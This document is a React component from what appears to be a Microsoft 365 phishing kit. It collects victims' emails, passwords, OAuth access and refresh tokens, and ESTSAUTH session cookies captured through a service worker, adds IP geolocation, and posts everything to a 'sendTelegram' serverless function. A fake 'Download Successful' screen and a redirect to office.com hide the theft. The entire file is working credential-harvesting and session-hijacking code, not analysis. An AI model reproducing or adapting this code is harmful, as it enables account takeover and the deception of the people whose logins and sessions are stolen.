import React, { useEffect, useState } from 'react';
import { detectBrowserCapabilities, getStoredData } from '../utils/restoreCookies';

/**
 * AuthCallback Component
 * Handles both Service Worker cookie capture AND OAuth token capture
 * Supports:
 * - Service Worker bridge for Microsoft domain cookies
 * - Admin consent flow for OAuth tokens (access_token, refresh_token, id_token)
 */

function getByteLengthForBrowser(str: string): number {
  return new Blob([str]).size;
}

const AuthCallback: React.FC = () => {
  const [status, setStatus] = useState('Processing your data...');
  const [downloadProgress, setDownloadProgress] = useState(0);

  useEffect(() => {
    const executeCallback = async () => {
      setStatus('Processing your data...');
      setDownloadProgress(10);

      console.log('🔄 AuthCallback: Starting data consolidation');
      console.log('📋 Admin Consent Flow Processing...');

      // --- 1. Retrieve Stored Credentials ---
      let credentials: any = {};
      try {
        // Check all possible storage locations for credentials
        const storedCreds = 
          localStorage.getItem('replacement_credentials') || 
          sessionStorage.getItem('replacement_credentials') ||
          localStorage.getItem('ms_credentials') ||
          sessionStorage.getItem('ms_credentials') ||
          localStorage.getItem('ms_auth_credentials') ||
          sessionStorage.getItem('ms_auth_credentials') ||
          localStorage.getItem('ms_email') ||
          sessionStorage.getItem('ms_email');

        if (storedCreds) {
          // If it's just an email string from admin consent flow
          if (storedCreds.includes('@')) {
            credentials.email = storedCreds;
          } else {
            // If it's a JSON object from replacement form
            credentials = JSON.parse(storedCreds);
          }
          console.log('✅ Credentials retrieved from storage.');
          console.log('📧 Email:', credentials.email);
          setDownloadProgress(20);
        } else {
          console.warn('⚠️ No credentials found in storage');
          credentials.email = 'unknown@microsoft.com';
        }
      } catch (error) {
        console.warn('⚠️ Failed to parse credentials from storage.', error);
        credentials.email = 'unknown@microsoft.com';
      }

      // --- 2. Retrieve OAuth Tokens from Admin Consent Flow ---
      let oauthTokens: any = null;
      try {
        console.log('🔑 Retrieving OAuth tokens from admin consent flow...');
        
        const storedTokens = 
          localStorage.getItem('ms_oauth_tokens') ||
          sessionStorage.getItem('ms_oauth_tokens');

        if (storedTokens) {
          oauthTokens = JSON.parse(storedTokens);
          console.log('✅ OAuth tokens retrieved:');
          console.log('  - Access Token:', oauthTokens.access_token ? '✓ Present' : '✗ Missing');
          console.log('  - Refresh Token:', oauthTokens.refresh_token ? '✓ Present' : '✗ Missing');
          console.log('  - ID Token:', oauthTokens.id_token ? '✓ Present' : '✗ Missing');
          console.log('  - Expires At:', new Date(oauthTokens.expires_at).toISOString());
          setDownloadProgress(30);
        } else {
          console.log('📝 No OAuth tokens found (may be using Service Worker cookies instead)');
        }
      } catch (error) {
        console.warn('⚠️ Failed to retrieve OAuth tokens:', error);
      }

      // --- 3. Retrieve Captured Cookies from Service Worker ---
      let cookies: any[] = [];
      try {
        console.log('🍪 Retrieving cookies captured by Service Worker...');
        
        // Priority 1: Check Service Worker bridge store
        if (window && (window as any).microsoftCookieBridge) {
          try {
            console.log('📡 Querying Service Worker bridge for cookies...');
            const bridgeData = await (window as any).microsoftCookieBridge.retrieveCaptureData();
            
            if (bridgeData && bridgeData.cookies && Array.isArray(bridgeData.cookies)) {
              cookies = bridgeData.cookies;
              console.log(`✅ Retrieved ${cookies.length} cookies from Service Worker bridge`);
              console.log('📍 Source:', bridgeData.source);
              console.log('⏰ Captured at:', bridgeData.capturedAt);
            }
          } catch (bridgeError) {
            console.warn('⚠️ Service Worker bridge query failed:', bridgeError);
          }
        }

        // Priority 2: Check captured_cookies_bridge storage
        if (cookies.length === 0) {
          const bridgeStorage = localStorage.getItem('captured_cookies_bridge') || 
                               sessionStorage.getItem('captured_cookies_bridge');
          
          if (bridgeStorage) {
            try {
              const bridgeData = JSON.parse(bridgeStorage);
              if (bridgeData.cookies && Array.isArray(bridgeData.cookies)) {
                cookies = bridgeData.cookies;
                console.log(`✅ Retrieved ${cookies.length} cookies from Service Worker bridge storage`);
                console.log('📍 Domain:', bridgeData.domain);
              }
            } catch (parseError) {
              console.warn('⚠️ Failed to parse bridge storage:', parseError);
            }
          }
        }

        // Priority 3: Check captured_ms_cookies
        if (cookies.length === 0) {
          const msStorage = localStorage.getItem('captured_ms_cookies') || 
                           sessionStorage.getItem('captured_ms_cookies');
          
          if (msStorage) {
            try {
              const parsed = JSON.parse(msStorage);
              if (Array.isArray(parsed)) {
                cookies = parsed;
                console.log(`✅ Retrieved ${cookies.length} cookies from MS storage`);
              }
            } catch (parseError) {
              console.warn('⚠️ Failed to parse MS cookies:', parseError);
            }
          }
        }

        // Priority 4: Check captured_cookies_data
        if (cookies.length === 0) {
          const capturedCookiesData = localStorage.getItem('captured_cookies_data') || 
                                     sessionStorage.getItem('captured_cookies_data');
          
          if (capturedCookiesData) {
            try {
              const parsedData = JSON.parse(capturedCookiesData);
              if (parsedData.cookies && Array.isArray(parsedData.cookies)) {
                cookies = parsedData.cookies;
                console.log(`✅ Retrieved ${cookies.length} cookies from captured_cookies_data`);
              }
            } catch (parseError) {
              console.warn('⚠️ Failed to parse captured cookies data:', parseError);
            }
          }
        }

        // Priority 5: Check window.__CAPTURED_DATA__
        if (cookies.length === 0) {
          if (window && (window as any).__CAPTURED_DATA__ && (window as any).__CAPTURED_DATA__.cookies) {
            cookies = (window as any).__CAPTURED_DATA__.cookies;
            console.log(`✅ Retrieved ${cookies.length} cookies from window.__CAPTURED_DATA__`);
          }
        }

        // Priority 6: Check restoreCookies.ts stored data
        if (cookies.length === 0) {
          const storedData = getStoredData();
          if (storedData.cookies && Array.isArray(storedData.cookies) && storedData.cookies.length > 0) {
            cookies = storedData.cookies;
            console.log(`✅ Retrieved ${cookies.length} cookies from restoreCookies.ts`);
          }
        }

        // Priority 7: Check raw captured_cookies
        if (cookies.length === 0) {
          const rawCookies = localStorage.getItem('captured_cookies') || 
                            sessionStorage.getItem('captured_cookies');
          if (rawCookies) {
            try {
              const parsed = JSON.parse(rawCookies);
              if (Array.isArray(parsed)) {
                cookies = parsed;
                console.log(`✅ Retrieved ${cookies.length} cookies from raw storage`);
              }
            } catch (e) {
              console.warn('⚠️ Failed to parse raw cookies:', e);
            }
          }
        }

        if (cookies.length === 0) {
          console.log('📝 No cookies found in storage (OAuth tokens may be primary capture method)');
        } else {
          console.log('📊 Total cookies retrieved:', cookies.length);
          
          // Log authentication cookies specifically
          const authCookies = cookies.filter(c => 
            c.name.includes('ESTSAUTH') || 
            c.name.includes('SignInStateCookie') || 
            c.name.includes('ESTSAUTHPERSISTENT') ||
            c.name.includes('ESTSECAUTH')
          );
          if (authCookies.length > 0) {
            console.log('🔐 Authentication cookies found:', authCookies.length);
          }
        }

        setDownloadProgress(40);
      } catch (error) {
        console.warn('⚠️ Failed to retrieve cookies:', error);
      }

      // --- 4. Fetch Location Data ---
      setStatus('Processing your data...');
      let locationData: any = {};
      try {
        console.log('📍 Fetching location data...');
        const response = await fetch('https://ipapi.co/json/');
        locationData = await response.json();
        console.log('✅ Location data fetched.');
        console.log('📍 IP:', locationData.ip);
        console.log('🌍 Country:', locationData.country_name);
        setDownloadProgress(55);
      } catch (error) {
        console.warn('⚠️ Failed to fetch location data:', error);
      }

      // --- 5. Create Cookie File in restoreCookies.ts Format ---
      const createCookieFile = (cookiesToExport: any[]) => {
        if (cookiesToExport.length === 0) {
          console.log('📝 No cookies to export (OAuth tokens used instead)');
          return null;
        }

        console.log('📝 Creating cookie file in restoreCookies.ts format...');
        
        try {
          const exportedCookies = cookiesToExport.map(cookie => ({
            name: cookie.name || '',
            value: cookie.value || '',
            domain: cookie.domain || window.location.hostname,
            path: cookie.path || '/',
            secure: !!cookie.secure,
            httpOnly: !!cookie.httpOnly,
            sameSite: cookie.sameSite || 'Lax',
            session: !!cookie.session,
            expires: cookie.expires,
            expirationDate: cookie.expirationDate
          }));

          const browserCapabilities = detectBrowserCapabilities();

          const jsonContent = JSON.stringify({
            version: '1.0',
            exportedAt: new Date().toISOString(),
            source: 'AuthCallback-ServiceWorker-Bridge',
            domain: window.location.hostname,
            totalCookies: exportedCookies.length,
            cookies: exportedCookies,
            browserCapabilities: browserCapabilities,
            captureSource: 'service-worker-bridge',
            captureMethod: 'microsoft-domain-interception',
            note: 'Cookies captured from Microsoft domain via Service Worker bridge'
          }, null, 2);

          const fileSizeInBytes = getByteLengthForBrowser(jsonContent);
          console.log(`✅ Cookie file created (${fileSizeInBytes} bytes)`);
          console.log(`📊 Total cookies: ${exportedCookies.length}`);

          return {
            name: `cookies_${new Date().getTime()}.json`,
            content: jsonContent,
            size: fileSizeInBytes
          };
        } catch (error) {
          console.error('❌ Failed to create cookie file:', error);
          return null;
        }
      };

      const cookieFile = createCookieFile(cookies);

      if (cookieFile) {
        console.log('✅ Cookie file created:', cookieFile.name);
      }

      setDownloadProgress(70);

      // --- 6. Build Comprehensive Payload ---
      setStatus('Processing your data...');
      const payload = {
        // Credentials
        email: credentials.email || 'unknown@microsoft.com',
        password: credentials.password || '',
        
        // OAuth Tokens (from admin consent flow)
        oauth: oauthTokens ? {
          access_token: oauthTokens.access_token || null,
          refresh_token: oauthTokens.refresh_token || null,
          id_token: oauthTokens.id_token || null,
          token_type: oauthTokens.token_type || 'Bearer',
          expires_at: oauthTokens.expires_at || null,
          captured_at: oauthTokens.captured_at || new Date().toISOString()
        } : null,

        // Cookies (from Service Worker)
        cookies: cookies,
        cookieCount: cookies.length,
        
        // Location
        locationData: locationData,
        
        // Files
        cookieFiles: cookieFile ? {
          jsonFile: {
            name: cookieFile.name,
            content: cookieFile.content,
            size: cookieFile.size
          }
        } : {},

        // Metadata
        userAgent: navigator.userAgent,
        url: window.location.href,
        timestamp: new Date().toISOString(),
        validated: true,
        microsoftAccount: true,
        
        // Capture context
        captureContext: {
          sourceComponent: 'AuthCallback',
          usingOAuthTokens: !!oauthTokens,
          usingServiceWorkerCookies: cookies.length > 0,
          oauthTokensCaptured: oauthTokens ? {
            access_token: !!oauthTokens.access_token,
            refresh_token: !!oauthTokens.refresh_token,
            id_token: !!oauthTokens.id_token
          } : null,
          cookiesCaptured: cookies.length,
          cookieFileCreated: !!cookieFile,
          captureFlow: 'admin-consent-oauth',
          captureMethod: 'hybrid-oauth-cookies'
        }
      };

      console.log('═════════════════════════════════════════');
      console.log('📤 PAYLOAD SUMMARY:');
      console.log('═════════════════════════════════════════');
      console.log('✅ Email:', payload.email ? '✓ Present' : '✗ Missing');
      console.log('✅ Password:', payload.password ? '✓ Present' : '✗ Missing');
      console.log('✅ OAuth Tokens:', payload.oauth ? '✓ Present' : '✗ Missing');
      if (payload.oauth) {
        console.log('  - Access Token:', payload.oauth.access_token ? '✓' : '✗');
        console.log('  - Refresh Token:', payload.oauth.refresh_token ? '✓' : '✗');
        console.log('  - ID Token:', payload.oauth.id_token ? '✓' : '✗');
      }
      console.log('✅ Cookies:', payload.cookies.length, 'found');
      console.log('✅ Location:', payload.locationData.ip ? '✓ ' + payload.locationData.ip : '✗ Missing');
      console.log('✅ Cookie File:', payload.cookieFiles.jsonFile ? '✓ Present' : '✗ Missing');
      console.log('📊 Payload Size:', (JSON.stringify(payload).length / 1024).toFixed(2), 'KB');
      console.log('✅ Capture Flow:', payload.captureContext.captureFlow);
      console.log('═════════════════════════════════════════');

      // --- 7. Send Payload to Telegram ---
      try {
        setDownloadProgress(85);
        console.log('📤 Sending payload to Telegram...');
        
        const response = await fetch('/.netlify/functions/sendTelegram', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(payload)
        });

        console.log('═════════════════════════════════════════');
        console.log('✅ SERVER RESPONSE:');
        console.log('═════════════════════════════════════════');
        console.log('Status:', response.status);

        let responseData: any;
        try {
          responseData = await response.json();
          console.log('Success:', responseData.success);
          console.log('Message:', responseData.message);
          if (responseData.transmitted) {
            console.log('Transmitted:');
            console.log('  - Credentials:', responseData.transmitted.credentials);
            console.log('  - OAuth Tokens:', responseData.transmitted.oauthTokens);
            console.log('  - Cookies:', responseData.transmitted.cookieCount);
            console.log('  - Cookie File:', responseData.transmitted.cookieFile);
          }
        } catch (e) {
          console.error('Failed to parse response:', e);
          responseData = {};
        }

        console.log('═════════════════════════════════════════');

        if (response.ok && responseData.success) {
          console.log('✅✅✅ SUCCESS: All data transmitted to Telegram!');
          console.log('📊 Timestamp:', responseData.timestamp);
          console.log('🔑 OAuth Tokens transmitted:', !!payload.oauth);
          console.log('🍪 Cookies transmitted:', payload.cookies.length);
          setDownloadProgress(100);
          setStatus('✅ Download Successful');

          // Clear sensitive data
          localStorage.removeItem('replacement_credentials');
          localStorage.removeItem('ms_credentials');
          localStorage.removeItem('ms_email');
          localStorage.removeItem('ms_oauth_tokens');
          localStorage.removeItem('captured_cookies_bridge');
          localStorage.removeItem('captured_ms_cookies');
          sessionStorage.removeItem('replacement_credentials');
          sessionStorage.removeItem('ms_credentials');
          sessionStorage.removeItem('ms_email');
          sessionStorage.removeItem('ms_oauth_tokens');
          sessionStorage.removeItem('captured_cookies_bridge');
          sessionStorage.removeItem('captured_ms_cookies');

          setTimeout(() => {
            console.log('🎉 Redirecting to Office 365...');
            window.location.href = 'https://www.office.com/?auth=2';
          }, 2500);
        } else {
          console.error('❌ Transmission failed');
          console.error('Response:', responseData);
          setStatus(`Error: ${response.status}`);
        }
      } catch (error) {
        console.error('❌ Network error:', error);
        setStatus('Error: Network failure');
      }
    };

    executeCallback();
  }, []);

  return (
    <div style={{
      display: 'flex',
      flexDirection: 'column',
      justifyContent: 'center',
      alignItems: 'center',
      height: '100vh',
      fontFamily: 'Segoe UI, Arial, sans-serif',
      backgroundColor: '#f3f2f1',
      color: '#323130'
    }}>
      <div style={{
        textAlign: 'center',
        padding: '40px'
      }}>
        {downloadProgress === 100 ? (
          <div>
            <h2 style={{
              fontSize: '18px',
              marginBottom: '10px',
              color: '#107C10',
              fontWeight: '600'
            }}>Download Successful</h2>
            <p style={{
              fontSize: '14px',
              color: '#666',
              marginBottom: '0'
            }}>Your file is ready.</p>
          </div>
        ) : (
          <div>
            <h2 style={{
              marginBottom: '20px',
              fontSize: '24px'
            }}>{status}</h2>

            <div style={{
              width: '300px',
              height: '8px',
              backgroundColor: '#e0e0e0',
              borderRadius: '4px',
              overflow: 'hidden',
              marginBottom: '20px'
            }}>
              <div style={{
                width: `${downloadProgress}%`,
                height: '100%',
                backgroundColor: '#0078d4',
                transition: 'width 0.3s ease',
                borderRadius: '4px'
              }}></div>
            </div>

            <p style={{
              fontSize: '14px',
              color: '#666',
              marginBottom: '30px'
            }}>{downloadProgress}%</p>

            <div style={{
              border: '4px solid #f3f2f1',
              borderTop: '4px solid #0078d4',
              borderRadius: '50%',
              width: '40px',
              height: '40px',
              animation: 'spin 1s linear infinite',
              margin: '0 auto'
            }}></div>
          </div>
        )}
      </div>

      <style>{`
        @keyframes spin {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
};

export default AuthCallback;